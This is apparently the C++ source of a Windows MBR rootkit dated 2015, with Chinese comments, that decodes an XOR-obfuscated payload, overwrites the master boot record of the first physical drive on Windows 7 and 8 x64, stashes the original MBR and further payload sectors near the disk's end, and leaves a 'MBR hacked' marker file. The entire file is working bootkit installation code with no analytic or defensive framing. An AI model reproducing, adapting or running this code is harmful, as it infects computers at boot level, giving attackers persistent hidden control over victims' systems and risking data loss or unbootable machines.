// MBR rootkit 2015 
// by Eric21.com

#include <windows.h>
#include <tchar.h>
#include <winioctl.h>
#include "targetver.h"
#include "res/win7_x64.h"
#include "res/win8_x64.h"
////////////////////////////////////////////
int mbrhackwin764()
{
	HANDLE hMark;//文件句柄
	hMark = CreateFile("C:\\MBR.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	////////////////////////////////////////////////
	if (hMark == INVALID_HANDLE_VALUE)
	{
		for (int i = 0; i < sizeof(w764Array); i++)
		{
			//szArray[i] = ~ szArray[i]; // 取反 ~
			w764Array[i] = w764Array[i] ^ 123; // 异或 ^
		}
		DWORD dwSize;
		dwSize = sizeof(w764Array);
		LPBYTE lpBuffer = new BYTE[dwSize];
		memcpy(lpBuffer, w764Array, dwSize);
		HANDLE hPhysicalDrive = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
			OPEN_EXISTING, 0, NULL);
		if (hPhysicalDrive == INVALID_HANDLE_VALUE)
		{
			//OutputDebugString("Open Drive0 Failed!");
			delete lpBuffer;
			return 0;
		}
		BYTE BootSector[512];//原始MBR
		DWORD NumberOfBytesRead;
		if (SetFilePointer(hPhysicalDrive, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!ReadFile(hPhysicalDrive, &BootSector, 512, &NumberOfBytesRead, NULL))
		{
			//OutputDebugString("读取原始MBR失败!");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}
		BYTE backBootSector[512];
		memcpy(&backBootSector, &BootSector, 512);
		memcpy(&backBootSector, lpBuffer, 446);


		SetFilePointer(hPhysicalDrive, 0, 0, FILE_BEGIN);//读文件的时候会移动指针，所以要设置下
		WriteFile(hPhysicalDrive, backBootSector, 512, &NumberOfBytesRead, NULL);//MBR感染446

		DISK_GEOMETRY_EX pdg = { 0 };
		DWORD junk = 0;                     // discard results
		DeviceIoControl(hPhysicalDrive,                       // device to be queried                            
			IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, // operation to perform                            
			NULL, 0,                       // no input buffer                            
			&pdg, sizeof(pdg),            // output buffer                            
			&junk,                         // # bytes returned                            
			(LPOVERLAPPED)NULL);          // synchronous I/O

		//备份MBR
		LARGE_INTEGER PositionFileTable;
		PositionFileTable.QuadPart = pdg.DiskSize.QuadPart / 512;
		PositionFileTable.QuadPart -= 10;
		PositionFileTable.QuadPart *= 512;
		NumberOfBytesRead = 0;
		if (!SetFilePointerEx(hPhysicalDrive, PositionFileTable, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!WriteFile(hPhysicalDrive, &BootSector, 512, &NumberOfBytesRead, NULL))
		{
			//OutputDebugString("备份原始MBR失败");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}

		//写入MBR其他数据
		PositionFileTable.QuadPart = pdg.DiskSize.QuadPart / 512;
		PositionFileTable.QuadPart -= 9;
		PositionFileTable.QuadPart *= 512;
		if (!SetFilePointerEx(hPhysicalDrive, PositionFileTable, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!WriteFile(hPhysicalDrive, lpBuffer + 512, ((dwSize - 512) / 512 + 1) * 512, &NumberOfBytesRead, NULL))//WriteFile第三个参数必须是512的整数倍
		{
			//OutputDebugString("Write Other Failed!");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}

		//备份MBR loader 
		PositionFileTable.QuadPart = pdg.DiskSize.QuadPart / 512;
		PositionFileTable.QuadPart -= 11;
		PositionFileTable.QuadPart *= 512;
		if (!SetFilePointerEx(hPhysicalDrive, PositionFileTable, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!WriteFile(hPhysicalDrive, backBootSector, 512, &NumberOfBytesRead, NULL))//WriteFile第三个参数必须是512的整数倍
		{
			//OutputDebugString("Write Other Failed!");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}


		delete lpBuffer;
		CloseHandle(hPhysicalDrive);
		/////////////////////////////////
		//创建修改标识
		char text[] = "MBR hacked";
		DWORD dwBytesWritten = 0;
		HANDLE hFile;//文件句柄
		hFile = CreateFile(
			"C:\\MBR.bin",//创建或打开的文件或设备的名称(这里是txt文件)。
			GENERIC_WRITE,// 文件访问权限,写
			0,//共享模式,这里设置0防止其他进程打开文件或设备
			NULL,//SECURITY_ATTRIBUTES结构，安全描述，这里NULL代表默认安全级别
			CREATE_ALWAYS,//对于存在或不存在的设置执行的操作，这里是始终创建
			FILE_ATTRIBUTE_NORMAL,//设置文件的属性，里面有高速缓存的选项
			NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			WriteFile(hFile, text, strlen(text), &dwBytesWritten, NULL);
		}
		CloseHandle(hFile);
	}
	CloseHandle(hMark);

	return 1;
}
////////////////////////////////////////////
int mbrhackwin864()
{
	HANDLE hMark;//文件句柄
	hMark = CreateFile("C:\\MBR.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	////////////////////////////////////////////////
	if (hMark == INVALID_HANDLE_VALUE)
	{
		for (int i = 0; i < sizeof(w864Array); i++)
		{
			//szArray[i] = ~ szArray[i]; // 取反 ~
			w864Array[i] = w864Array[i] ^ 123; // 异或 ^
		}
		DWORD dwSize;
		dwSize = sizeof(w864Array);
		LPBYTE lpBuffer = new BYTE[dwSize];
		memcpy(lpBuffer, w864Array, dwSize);
		HANDLE hPhysicalDrive = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
			OPEN_EXISTING, 0, NULL);
		if (hPhysicalDrive == INVALID_HANDLE_VALUE)
		{
			//OutputDebugString("Open Drive0 Failed!");
			delete lpBuffer;
			return 0;
		}
		BYTE BootSector[512];//原始MBR
		DWORD NumberOfBytesRead;
		if (SetFilePointer(hPhysicalDrive, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!ReadFile(hPhysicalDrive, &BootSector, 512, &NumberOfBytesRead, NULL))
		{
			//OutputDebugString("读取原始MBR失败!");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}
		BYTE backBootSector[512];
		memcpy(&backBootSector, &BootSector, 512);
		memcpy(&backBootSector, lpBuffer, 446);


		SetFilePointer(hPhysicalDrive, 0, 0, FILE_BEGIN);//读文件的时候会移动指针，所以要设置下
		WriteFile(hPhysicalDrive, backBootSector, 512, &NumberOfBytesRead, NULL);//MBR感染446

		DISK_GEOMETRY_EX pdg = { 0 };
		DWORD junk = 0;                     // discard results
		DeviceIoControl(hPhysicalDrive,                       // device to be queried                            
			IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, // operation to perform                            
			NULL, 0,                       // no input buffer                            
			&pdg, sizeof(pdg),            // output buffer                            
			&junk,                         // # bytes returned                            
			(LPOVERLAPPED)NULL);          // synchronous I/O

		//备份MBR
		LARGE_INTEGER PositionFileTable;
		PositionFileTable.QuadPart = pdg.DiskSize.QuadPart / 512;
		PositionFileTable.QuadPart -= 10;
		PositionFileTable.QuadPart *= 512;
		NumberOfBytesRead = 0;
		if (!SetFilePointerEx(hPhysicalDrive, PositionFileTable, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!WriteFile(hPhysicalDrive, &BootSector, 512, &NumberOfBytesRead, NULL))
		{
			//OutputDebugString("备份原始MBR失败");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}

		//写入MBR其他数据
		PositionFileTable.QuadPart = pdg.DiskSize.QuadPart / 512;
		PositionFileTable.QuadPart -= 9;
		PositionFileTable.QuadPart *= 512;
		if (!SetFilePointerEx(hPhysicalDrive, PositionFileTable, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!WriteFile(hPhysicalDrive, lpBuffer + 512, ((dwSize - 512) / 512 + 1) * 512, &NumberOfBytesRead, NULL))//WriteFile第三个参数必须是512的整数倍
		{
			//OutputDebugString("Write Other Failed!");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}

		//备份MBR loader 
		PositionFileTable.QuadPart = pdg.DiskSize.QuadPart / 512;
		PositionFileTable.QuadPart -= 11;
		PositionFileTable.QuadPart *= 512;
		if (!SetFilePointerEx(hPhysicalDrive, PositionFileTable, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
			!WriteFile(hPhysicalDrive, backBootSector, 512, &NumberOfBytesRead, NULL))//WriteFile第三个参数必须是512的整数倍
		{
			//OutputDebugString("Write Other Failed!");
			delete lpBuffer;
			CloseHandle(hPhysicalDrive);
			return 0;
		}


		delete lpBuffer;
		CloseHandle(hPhysicalDrive);
		/////////////////////////////////
		//创建修改标识
		char text[] = "MBR hacked";
		DWORD dwBytesWritten = 0;
		HANDLE hFile;//文件句柄
		hFile = CreateFile(
			"C:\\MBR.bin",//创建或打开的文件或设备的名称(这里是txt文件)。
			GENERIC_WRITE,// 文件访问权限,写
			0,//共享模式,这里设置0防止其他进程打开文件或设备
			NULL,//SECURITY_ATTRIBUTES结构，安全描述，这里NULL代表默认安全级别
			CREATE_ALWAYS,//对于存在或不存在的设置执行的操作，这里是始终创建
			FILE_ATTRIBUTE_NORMAL,//设置文件的属性，里面有高速缓存的选项
			NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			WriteFile(hFile, text, strlen(text), &dwBytesWritten, NULL);
		}
		CloseHandle(hFile);
	}
	CloseHandle(hMark);

	return 1;
}
////////////////////////////////////////////
//-------------------------------------------------------------------------
// 函数    : IsWinVerEqualTo
// 功能    : 判断是否=某个特定的系统版本
// 返回值  : BOOL
// 参数    : DWORD dwMajorVersion
// 参数    : DWORD dwMinorVersion
// 附注    :
//-------------------------------------------------------------------------
BOOL IsWinVersionEqualTo(DWORD dwMajorVersion, DWORD dwMinorVersion)
{
	OSVERSIONINFOEXW osvi = { 0 };
	DWORDLONG dwlConditionMask = 0;

	// 1、初始化系统版本信息数据结构
	ZeroMemory(&osvi, sizeof(osvi));
	osvi.dwOSVersionInfoSize = sizeof(osvi);
	osvi.dwMajorVersion = dwMajorVersion;
	osvi.dwMinorVersion = dwMinorVersion;

	// 2、初始化条件掩码
	VER_SET_CONDITION(dwlConditionMask, VER_MAJORVERSION, VER_EQUAL);
	VER_SET_CONDITION(dwlConditionMask, VER_MINORVERSION, VER_EQUAL);

	return ::VerifyVersionInfoW(&osvi, VER_MAJORVERSION | VER_MINORVERSION, dwlConditionMask);
}
//封装一下使用就更方便了，譬如要判断当前是Window7，用IsWinVerEqualTo(6, 1)即可。
///////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
typedef void (WINAPI *LPFN_PGNSI)(LPSYSTEM_INFO);
LPFN_PGNSI pGNSI = (LPFN_PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
int GetSystemBits()
{
	SYSTEM_INFO si;
	GetNativeSystemInfo(&si);
	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
		si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
	{
		return 64;
	}
	return 32;
}
////////////////////////////////////////////////
int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	char WindowsVersion[] = {NULL};
	if (IsWinVersionEqualTo(5, 1))
	{
		/* Windows XP */
		lstrcpy(WindowsVersion,"WINDOWS_XP");
		MessageBox(NULL, WindowsVersion, "系统版本", MB_OK);
	}

	if (IsWinVersionEqualTo(5, 2))
	{
	/* Windows Server 2003 */
	lstrcpy(WindowsVersion,"WINDOWS_SERVER_2003");
	MessageBox(NULL, WindowsVersion, "系统版本", MB_OK);
	}

	if (IsWinVersionEqualTo(6, 0))
	{
	/* Windows Vista, Windows Server 2008 */
	lstrcpy(WindowsVersion,"WINDOWS_VISTA");
	MessageBox(NULL, WindowsVersion, "系统版本", MB_OK);
	}

	if (IsWinVersionEqualTo(6, 1))
	{
	/* Windows 7, Windows Server 2008 R2 */
	lstrcpy(WindowsVersion,"WINDOWS_7");
	MessageBox(NULL, WindowsVersion, "系统版本", MB_OK);
	if (GetSystemBits()==64)
		{
			MessageBox(NULL, "win7 x64", "系统版本", MB_OK);
			mbrhackwin764();
		}
	}

	if (IsWinVersionEqualTo(6, 2))
	{
	/* Windows 8 */
	lstrcpy(WindowsVersion,"WINDOWS_8");
	MessageBox(NULL, WindowsVersion, "系统版本", MB_OK);
	if (GetSystemBits() == 64)
		{
			MessageBox(NULL, "win8 x64", "系统版本", MB_OK);
			mbrhackwin864();
		}
	}
return 1;
}
////////////////////////////////////////////